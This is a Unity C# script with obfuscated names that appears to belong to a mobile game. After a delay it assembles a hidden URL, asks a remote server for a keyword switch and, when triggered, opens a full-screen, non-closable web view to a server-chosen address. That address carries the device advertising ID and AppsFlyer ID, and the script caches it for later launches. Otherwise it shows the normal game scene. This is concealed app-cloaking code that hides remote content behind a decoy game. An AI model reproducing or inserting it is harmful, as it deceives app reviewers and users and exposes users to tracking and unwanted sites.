using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class GzxcAPsdkqwe : MonoBehaviour
{
    public List<string> hzxcashaqwe;
    [HideInInspector] public string bdpasqwe = "";
    [HideInInspector] public string hzcadqpwe = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("hsaodmoqwe") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
                (string advertisingId, bool trackingEnabled, string error) => { bdpasqwe = advertisingId; });
        }
    }

    private void Start()
    {
        StartCoroutine(GHASAOSmdoqwe());
    }

    private IEnumerator GHASAOSmdoqwe()
    {
        yield return new WaitForSeconds(7f);

        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("gzxcapdqewgasd", string.Empty) != string.Empty)
            {
                Soasmdimqwe(PlayerPrefs.GetString("gzxcapdqewgasd"));
            }
            else
            {
                foreach (string bkoasd in hzxcashaqwe)
                {
                    hzcadqpwe += bkoasd;
                }
                
                Debug.Log(hzcadqpwe);

                StartCoroutine(HzxcJbadqwe());
            }
        }
        else
        {
            OapslAdmoqiwe();
        }
    }

    private void OapslAdmoqiwe()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene(2);
    }

    private IEnumerator HzxcJbadqwe()
    {
        using (UnityWebRequest hzosd = UnityWebRequest.Get(hzcadqpwe))
        {
            hzosd.timeout = 4;
            yield return hzosd.SendWebRequest();
            if (hzosd.isNetworkError)
            {
                OapslAdmoqiwe();
            }

            try
            {
                if (hzosd.result == UnityWebRequest.Result.Success)
                {
                    if (hzosd.downloadHandler.text.Contains("kigava"))
                    {
                        try
                        {
                            var laksodwe = hzosd.downloadHandler.text.Split('|');
                            Soasmdimqwe(
                                laksodwe[0] + "?idfa=" + bdpasqwe + PlayerPrefs.GetString("fozxcjaidwe", string.Empty),
                                laksodwe[1], int.Parse(laksodwe[2]));
                        }
                        catch
                        {
                            Soasmdimqwe(hzosd.downloadHandler.text + "?idfa=" + bdpasqwe + "&gaid=" +
                                                  AppsFlyerSDK.AppsFlyer.getAppsFlyerId() +
                                                  PlayerPrefs.GetString("fozxcjaidwe", string.Empty));
                        }
                    }
                    else
                    {
                        OapslAdmoqiwe();
                    }
                }
                else
                {
                    OapslAdmoqiwe();
                }
            }
            catch
            {
                OapslAdmoqiwe();
            }
        }
    }

    private void Soasmdimqwe(string gzxcapdqewgasd, string asodmoqwe = "", int vkasodmwe = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var kzjdadowe = gameObject.AddComponent<UniWebView>();
        kzjdadowe.SetToolbarDoneButtonText("");
        switch (asodmoqwe)
        {
            case "0":
                kzjdadowe.SetShowToolbar(true, false, false, true);
                break;
            default:
                kzjdadowe.SetShowToolbar(false);
                break;
        }

        kzjdadowe.Frame = new Rect(0, vkasodmwe, Screen.width, Screen.height - vkasodmwe);
        kzjdadowe.OnShouldClose += (view) => { return false; };
        kzjdadowe.SetSupportMultipleWindows(true);
        kzjdadowe.SetAllowBackForwardNavigationGestures(true);
        kzjdadowe.OnMultipleWindowOpened += (view, windowId) =>
        {
            kzjdadowe.SetShowToolbar(true);
        };
        kzjdadowe.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (asodmoqwe)
            {
                case "0":
                    kzjdadowe.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    kzjdadowe.SetShowToolbar(false);
                    break;
            }
        };
        kzjdadowe.OnOrientationChanged += (view, orientation) =>
        {
            kzjdadowe.Frame = new Rect(0, vkasodmwe, Screen.width, Screen.height - vkasodmwe);
        };
        kzjdadowe.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("gzxcapdqewgasd", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("gzxcapdqewgasd", url);
            }
        };
        kzjdadowe.Load(gzxcapdqewgasd);
        kzjdadowe.Show();
    }
}
